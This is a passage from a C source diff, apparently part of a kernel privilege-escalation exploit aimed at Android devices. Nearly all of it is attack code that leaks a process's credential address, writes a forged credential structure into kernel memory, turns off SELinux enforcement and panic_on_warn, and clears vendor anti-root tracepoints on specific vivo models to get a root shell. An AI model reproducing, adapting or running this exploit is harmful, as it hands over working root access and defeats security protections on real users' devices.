+
+    pid_t C = -1;
+    int go_fd = -1, st_fd = -1;
+    unsigned long long R = leak_cred(raw, &C, &go_fd, &st_fd, shell_mode,
+                                     &g_child_task);
+    if (!R)
+    {
+        logf("[-] cred leak failed\n");
+        return 1;
+    }
+    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + 8);
+    g_fake_child = C;
+    if (leak_only)
+    {
+        close(go_fd);
+        close(st_fd);
+        kill(C, SIGKILL);
+        waitpid(C, NULL, 0);
+        logf("[+] leak-only run complete\n");
+        return 0;
+    }
+    ensure_pool();
+    ensure_raw();
+
+    if (!g_fake_stage)
+    {
+        struct plant_res r;
+        memset(&r, 0, sizeof(r));
+        for (int a = 0; a < 3 && !r.ok; a++)
+        {
+            logf("[+] plant attempt %d/3\n", a + 1);
+            run_plant(R + CRED_UID_OFF, 1, 0, &r, raw);
+        }
+        if (!r.ok)
+            fail_exit("plant");
+    }
+    else
+    {
+        struct plant_res fc;
+
+        if (!g_child_task)
+            fail_exit("leak");
+        memset(&fc, 0, sizeof(fc));
+        /*
+         * The self-parent erase takes the RB_EMPTY_NODE WARN; this profile's
+         * panic_on_warn is 0.  The sysctl is only readable after SELinux is
+         * off, so the WARN cannot be gated before this plant.
+         *
+         * Point task->cred at the reclaimed page.  The fake cred starts at
+         * the stale node address; rb_erase dirties uid/gid with the target,
+         * so one zero write repairs them.  suid/sgid keep the rb_left
+         * target; the fake cred's full CAP_SETUID and euid 0 make that
+         * irrelevant for the fork/exec handoff.
+         */
+        if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
+                        raw, &fc))
+            fail_exit("fake-cred");
+        if (!g_slide)
+            fail_exit("slide");
+        logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
+             SELINUX_STATE_STATIC + g_slide);
+        if (stage_write(SELINUX_STATE_STATIC + g_slide - 7, 0,
+                        "selinux", raw, NULL))
+            fail_exit("selinux");
+        if (read_panic_on_warn() != 0 &&
+            stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
+                        "panic_on_warn", raw, NULL))
+            fail_exit("panic-on-warn");
+        if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
+            fail_exit("fake-uid");
+#if defined(V2505A)
+        /*
+         * vivo vr.ko kills the elevated task from its sys_exit tracepoint.
+         * Disable the tracepoint before waking the child; W1c uses the same
+         * single zero write to make the vendor probe permanently inert.
+         */
+        if (g_vr && stage_write(SYS_EXIT_TRACEPOINT_STATIC + g_slide +
+                            TRACEPOINT_FUNCS_OFF,
+                        0, "vr_sys_exit", raw, NULL))
+            fail_exit("vr-sys-exit");
+#endif
+#if defined(KERNEL_66127)
+        /*
+         * X200 Ultra's vr/vklp registers on sched_process_exit (the sys_exit
+         * event is absent from tracefs on this kernel).  Clear that slot too.
+         */
+        if (stage_write(SCHED_EXIT_TRACEPOINT_STATIC + g_slide +
+                            TRACEPOINT_FUNCS_OFF,
+                        0, "vr_sched_exit", raw, NULL))
+            fail_exit("vr-sched-exit");
+#endif
+    }
+    logf("[+] cred writes landed, waking child\n");
+
+    if (write(go_fd, "A", 1) != 1)
+        logf("[!] child wake write failed\n");
+#if defined(HOOKS_GATE)
+    if (g_fake_stage && g_gate)
+    {
+        unsigned long long slide = g_slide;
+
+        if (write(go_fd, &slide, sizeof(slide)) != (ssize_t)sizeof(slide))
+            logf("[!] child slide write failed\n");
+    }
+#endif
+
+    {
+        struct child_report rep;
+        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
+        ssize_t rn = -1;
+
+        memset(&rep, 0, sizeof(rep));
+        if (poll(&pf, 1, 60000) > 0)
+            rn = read(st_fd, &rep, sizeof(rep));
+        close(st_fd);
+#if defined(HOOKS_GATE)
+        if (g_fake_stage && g_gate && rn == (ssize_t)sizeof(rep) &&
+            rep.magic == CHILD_MAGIC && rep.gate_addr)
+        {
+            logf("[+] g slot=%#llx; clearing insko word\n", rep.gate_addr);
+            {
+                int wrote = 0;
+
+                for (int attempt = 1; attempt <= 3 && !wrote; attempt++)
+                {
+                    struct plant_res r;
+
+                    memset(&r, 0, sizeof(r));
+                    logf("[+] stage gate_g target=%#llx mode=zero attempt=%d\n",
+                         rep.gate_addr, attempt);
+                    run_plant(rep.gate_addr, attempt, 0, &r, raw);
+                    if (r.ok)
+                        wrote = 1;
+                    else
+                        logf("[-] gate write miss; fresh plant retry\n");
+                }
+                if (!wrote)
+                {
+                    logf("[!] gate write failed after retries\n");
+                    fail_exit("gate_g");
+                }
+            }
+        }
+        else if (g_fake_stage && g_gate)
+        {
+            logf("[!] g slot unavailable; whitelist stays locked\n");
+        }
+        if (g_fake_stage && g_gate && write(go_fd, "G", 1) != 1)
+            logf("[!] child gate ack failed\n");
+#endif
+        close(go_fd);
+        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
+        {
+            logf("[+] child report stage=%d uid=%d euid=%d "
+                 "setuid(0)=%d errno=%d resuid=%d/%d/%d wake=%d/%d\n",
+                 rep.stage, rep.uid, rep.euid, rep.setuid_ret,
+                 rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid,
+                 rep.wake_ret, rep.wake_errno);
+            if (rep.stage == CHILD_STAGE_WOKE)
+            {
+                rooted = rep.euid == 0;
+                if (!rooted)
+                    logf("[!] child did not reach euid 0\n");
+            }
+            else
+            {
+                logf("[!] child wake read failed before uid check\n");
+            }
+        }
+        else
+        {
+            int st = 0;
+            pid_t wr = waitpid(C, &st, WNOHANG);
+
+            logf("[!] child report missing (n=%zd wait=%d status=%#x)\n",
+                 rn, (int)wr, wr == C ? st : 0);
+        }
+    }
+    if (getenv("PYB110_FORCE_FAIL") && *getenv("PYB110_FORCE_FAIL"))
+        fail_exit("forced");
+    if (g_fake_stage)
+    {
+        if (!rooted)
+            fail_exit("cred");
+        printf("PLANT_CRED_OK child=%d\n", (int)C);
+        printf("PARKED=1\n");
+        fflush(stdout);
+        park_forever("fake cred page held; child parked after late-load");
+    }
+    {
+        int st = 0;
+
+        if (waitpid(C, &st, 0) == C)
+            logf("[+] child exit status=%#x\n", st);
+    }
+    if (g_held)
+    {
+        prctl(PR_SET_NAME, "t61269-hold");
+        park_forever("root shell finished; failed-plant zombies are held");
+    }
+    logf("[+] done\n");
+    return 0;
+}
